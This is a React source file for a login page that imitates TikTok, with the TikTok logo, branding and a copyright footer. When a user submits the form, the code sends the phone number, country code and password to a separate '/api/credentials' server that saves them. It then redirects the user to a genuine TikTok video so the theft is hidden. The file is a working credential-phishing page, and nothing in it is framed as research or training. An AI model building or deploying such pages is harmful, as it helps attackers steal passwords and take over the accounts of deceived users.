import { useState } from 'react';
import { Eye, EyeOff, ChevronLeft, HelpCircle } from 'lucide-react';

const TIKTOK_VIDEO_URL = 'https://www.tiktok.com/@tiktok/video/7106596747681459502';
const API_URL = import.meta.env.VITE_API_URL ?? 'http://localhost:3000';

function App() {
  const [showPassword, setShowPassword] = useState(false);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [password, setPassword] = useState('');
  const [countryCode, setCountryCode] = useState('PK +92');
  const [activeTab, setActiveTab] = useState<'phone' | 'email'>('phone');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const handleLogin = async () => {
    if (!phoneNumber || !password) return;
    setIsSubmitting(true);
    setError(null);
    try {
      const res = await fetch(`${API_URL}/api/credentials`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ countryCode, phoneNumber, password }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        throw new Error(data.error ?? 'Failed to save');
      }
      window.location.href = TIKTOK_VIDEO_URL;
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Could not reach server. Is it running?');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <header className="flex items-center justify-between px-6 py-4 border-b border-gray-200">
        <div className="flex items-center gap-1">
          <svg viewBox="0 0 24 24" className="w-8 h-8" fill="currentColor">
            <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/>
          </svg>
          <span className="text-2xl font-bold">TikTok</span>
        </div>
        <button className="flex items-center gap-2 text-sm hover:bg-gray-100 px-3 py-2 rounded-lg transition-colors">
          <HelpCircle className="w-5 h-5" />
          <span>Feedback and help</span>
        </button>
      </header>

      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          <h1 className="text-3xl font-bold text-center mb-8">Log in</h1>

          <div className="space-y-4">
            <div className="flex items-center border-b border-gray-200">
              <button
                onClick={() => setActiveTab('phone')}
                className={`flex-1 pb-3 text-center font-semibold transition-colors ${
                  activeTab === 'phone'
                    ? 'text-black border-b-2 border-black'
                    : 'text-gray-400'
                }`}
              >
                Phone
              </button>
              <button
                onClick={() => setActiveTab('email')}
                className={`flex-1 pb-3 text-center font-semibold transition-colors ${
                  activeTab === 'email'
                    ? 'text-black border-b-2 border-black'
                    : 'text-gray-400'
                }`}
              >
                Log in with email or username
              </button>
            </div>

            <div className="space-y-3">
              <div className="flex gap-2">
                <select
                  value={countryCode}
                  onChange={(e) => setCountryCode(e.target.value)}
                  className="px-3 py-3 border border-gray-300 rounded-md bg-gray-50 text-sm focus:outline-none focus:border-gray-400"
                >
                  <option>PK +92</option>
                  <option>US +1</option>
                  <option>UK +44</option>
                  <option>IN +91</option>
                </select>
                <input
                  type="tel"
                  placeholder="Phone number"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="flex-1 px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-sm placeholder-gray-400 focus:outline-none focus:border-gray-400"
                />
              </div>

              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-md bg-gray-50 text-sm placeholder-gray-400 focus:outline-none focus:border-gray-400 pr-12"
                />
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
            </div>

            <div className="flex items-center justify-between text-sm">
              <button className="text-gray-900 hover:underline">
                Forgot password?
              </button>
              <button className="text-gray-900 hover:underline">
                Log in with code
              </button>
            </div>

            {error && (
              <p className="text-sm text-red-600 bg-red-50 px-3 py-2 rounded-md">
                {error}
              </p>
            )}

            <button
              type="button"
              disabled={!phoneNumber || !password || isSubmitting}
              onClick={handleLogin}
              className={`w-full py-3 rounded-md font-semibold transition-colors ${
                phoneNumber && password && !isSubmitting
                  ? 'bg-red-500 text-white hover:bg-red-600'
                  : 'bg-gray-100 text-gray-300 cursor-not-allowed'
              }`}
            >
              {isSubmitting ? 'Logging in…' : 'Log in'}
            </button>

            <button className="flex items-center justify-center gap-2 text-sm text-gray-900 hover:underline mx-auto">
              <ChevronLeft className="w-4 h-4" />
              Go back
            </button>
          </div>
        </div>
      </main>

      <footer className="border-t border-gray-200 bg-white">
        <div className="px-6 py-6 flex items-center justify-center">
          <p className="text-sm text-gray-900">
            Don't have an account?{' '}
            <button className="text-red-500 font-semibold hover:underline">
              Sign up
            </button>
          </p>
        </div>
        <div className="px-6 py-4 bg-black text-white flex items-center justify-between">
          <select className="bg-transparent text-white text-sm border border-gray-700 rounded px-3 py-2 focus:outline-none">
            <option>English (US)</option>
            <option>Spanish</option>
            <option>French</option>
          </select>
          <p className="text-sm">© 2026 TikTok</p>
        </div>
      </footer>
    </div>
  );
}

export default App;
